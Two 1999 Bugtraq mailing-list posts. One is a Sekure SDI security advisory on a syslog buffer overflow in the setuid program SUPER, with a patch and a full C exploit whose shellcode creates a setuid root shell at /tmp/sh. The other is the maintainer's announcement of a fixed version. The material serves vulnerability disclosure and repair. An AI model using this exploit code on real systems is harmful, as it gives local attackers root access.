Date: Thu, 25 Feb 1999 01:43:37 -0300
From: c0nd0r <root@SEKURE.ORG>
To: BUGTRAQ@netspace.org
Subject: SUPER buffer overflow

                            s e k u r e   S D I
                           http://www.sekure.org
                         -------------------------
                     Brazilian Information Security Team


                  -> SUPER's log function buffer overflow <-



1. Description

  We've seen a discussion weeks ago in the bugtraq mailing list about the
vulnerability found in the SUPER package which could lead to root
compromise. The author had released a patch and the problem was fixed in
the newest version.

  While perusing through the super 3.11.6, we've noticed another possible
buffer overflow condition if the syslog option is enabled (error.c):

  (Error() function)
  (..)
     if (error_syslog) {
        char newfmt[MAXPRINT], buf[MAXPRINT];
  (..)
        va_start(ap, fmt);
        (void) vsprintf(buf, newfmt, ap);
        va_end(ap);
  (..)

 MAXPRINT is 1300 bytes long.

 Error() function is used to return error messages which means it probably
 use a user supplied data as an argument (it does):

 (time.c)
 (...)
  return Error(0, 0, "%t\n\tInvalid time <%s>\n", str);
 (...)

 str is the string supplied by the -T option.

 As we can see, this bug is bit different from the one reported last week.
 I've noticed the 3.11.9 patchlevel is vulnerable to the problem, which
 might mean the newest version of super is vulnerable.


2.Consequences

  Local user may gain root privileges.


3. Recommendations

 Please, apply the patch below or remove the suid bit from the super
 binary (chmod u-s /usr/local/bin/super).

--- error.c     Thu Feb 25 00:38:25 1999
+++ error.patch.c       Thu Feb 25 01:07:53 1999
@@ -321,7 +321,7 @@
        if (tag)
            StrLCat(newfmt, tag, sizeof(newfmt));
        va_start(ap, fmt);
-       (void) vsprintf(buf, newfmt, ap);
+       (void) vsnprintf(buf, sizeof(buf), newfmt, ap);
        va_end(ap);
        SysLog(error_priority, buf);
     }
@@ -485,7 +485,7 @@
        StrLCat(newfmt, fmt, sizeof(newfmt));
        if (tag)
            StrLCat(newfmt, tag, sizeof(newfmt));
-       (void) vsprintf(buf, newfmt, ap);
+       (void) vsnprintf(buf, sizeof(buf), newfmt, ap);
        va_end(ap);
        SysLog(error_priority, buf);
     }


4. Exploit

  You will find the exploit for this issue in our page as well.
  http://ssc.sekure.org

--------------- SDI-super.c --------------------------------------
/*
 * [            Sekure SDI              ]
 * [    Brazilian Info Security Team    ]
 * | ---------------------------------- ]
 * |     SUPER exploit for linux        |
 * | ---------------------------------- |
 * |                                    |
 * |      http://ssc.sekure.org         |
 * |   Sekure SDI Secure Coding Team    |
 * |                                    |
 * | ---------------------------------- |
 * |   by c0nd0r <condor@sekure.org>    |
 * | ---------------------------------- |
 * [ thanks for the ppl at sekure.org:  ]
 * [ jamez(shellcode), bishop, dumped,  ]
 * [ bahamas, fcon, vader, yuckfoo.     ]
 *
 *
 * This will exploit a buffer overflow condition in the log section of
 * the SUPER program.
 *
 * It will create a suid bash owned by root at /tmp/sh.
 * (It'll defeat the debian bash-2.xx protection against rootshell)
 *
 * Note: The SUPER program must be compiled with the SYSLOG option.
 *
 * also thanks people from #uground (irc.brasnet.org network)
 *
 */

char shellcode[] =
        "\xeb\x31\x5e\x89\x76\x32\x8d\x5e\x08\x89\x5e\x36"
        "\x8d\x5e\x0b\x89\x5e\x3a\x31\xc0\x88\x46\x07\x88"
        "\x46\x0a\x88\x46\x31\x89\x46\x3e\xb0\x0b\x89\xf3"
        "\x8d\x4e\x32\x8d\x56\x3e\xcd\x80\x31\xdb\x89\xd8"
        "\x40\xcd\x80\xe8\xca\xff\xff\xff"
        "/bin/sh -c cp /bin/sh /tmp/sh; chmod 4755 /tmp/sh";


unsigned long getsp ( void) {
  __asm__("mov %esp,%eax");
}

main ( int argc, char *argv[] ) {
 char itamar[2040]; // ta mar mesmo
 long addr;
 int x, y, offset = 1000, align=0;

 if ( argc > 1) offset = atoi(argv[1]);

 addr = getsp() + offset;

 for ( x = 0; x < (1410-strlen(shellcode)); x++)
   itamar[x] = 0x90;

 for (  ; y < strlen(shellcode); x++, y++)
   itamar[x] = shellcode[y];

 for ( ; x < 1500; x+=4) {
  itamar[x  ] = (addr & 0xff000000) >> 24;
  itamar[x+1] = (addr & 0x000000ff);
  itamar[x+2] = (addr & 0x0000ff00) >> 8;
  itamar[x+3] = (addr & 0x00ff0000) >> 16;
 }

 itamar[x++] = '\0';
 printf ( "\nwargames at 0x%x, offset %d\n", addr, offset);
 printf ( "Look for a suid shell root owned at /tmp/sh\n");

 execl ( "/usr/local/bin/super", "super", "-T",itamar, (char *) 0);

}
---------------------- eof -----------------------------------------


5. Contacts


  Sekure SDI Advisory is a publication of Sekure SDI
  Brazilian Information Security Team
  http://www.sekure.org
  mailto:info@sekure.org

  This advisory has been written by Secure Coding Sekure SDI Group.
  http://ssc.sekure.org
  mailto:securecode@sekure.org

  Subscribe the "Best of Security Brasil" (bos-br) Mailing list
  http://bos.sekure.org (portuguese as the main language)
  mailto:bos-br-request@sekure.org


---
securecode@sekure.org
written by c0nd0r <condor@sekure.org>

------------------------------------------------------------------------

Date: Fri, 26 Feb 1999 01:34:56 -0800
From: William Deich <will@UCOLICK.ORG>
To: BUGTRAQ@netspace.org
Subject: Buffer Overflow in Super (new)

Sekure SDI (http://www.sekure.org) has either just announced or is about
to announce a new local root exploit, via a buffer overflow in super.  This
note is to announce that a fixed version (super v3.12.1) is now available at
        ftp.ucolick.org:/pub/users/will/super-3.12.1.tar.gz

This is the second buffer overflow problem in as many weeks, so I took
a hard look at what's gone wrong, and here's what I've done about it.

Clearly, it was a great mistake when super was "enhanced" to allow users to
    o  pass command-line options to super (to help people verify and debug
        their super.tab files),
    o  specify super.tab files (also for testing).
Either of these allow users to make data-driven attacks on super.

The weakness created by these features has been fixed with
the following changes:

i) super now limits the length of each option passed to it (note that
    this is not the same as the ordinary limits super puts on arguments
    that it passes through to the commands invoked by super for the user);

ii) super now limits the total length of all options passed to it
    (again, this is separate from limiting the total length of arguments
    passed to commands invoked by super for the user);

iii) super ensures that all its option characters are from a limited set.

iv) When super is running in debug mode, it won't execute any commands, but
    it will process user-supplied super.tab files.  This makes potential
    security holes, because it might be possible that nasty data can be
    passed through a user-supplied super.tab file, just like there were
    buffer-overruns from command-line arguments.  Therefore, super no longer
    remains as root when checking a user-supplied super.tab file; instead,
    it reverts to the caller's real uid, and prints a large explanatory message.
    (This does mean that certain checks cannot be done without being root.
    The tradeoff for increased security is obviously worthwhile.)

In sum, items (i) and (ii) ensure that users can't create buffer overflows
>from the command line.  Item (iii) is insurance that users can't
pass strings that might be confusing to super in some other, unanticipated
manner.  Item (iv) avoids buffer overflows from user-supplied super.tab
files.

With apologies for the inconvenience to all,

-Will
--
William Deich
UCO / Lick Observatory     |  Internet: will@ucolick.org
University of California   |  Phone: (831) 459-3913
Santa Cruz, CA  95064      |  Fax:   (831) 426-3115

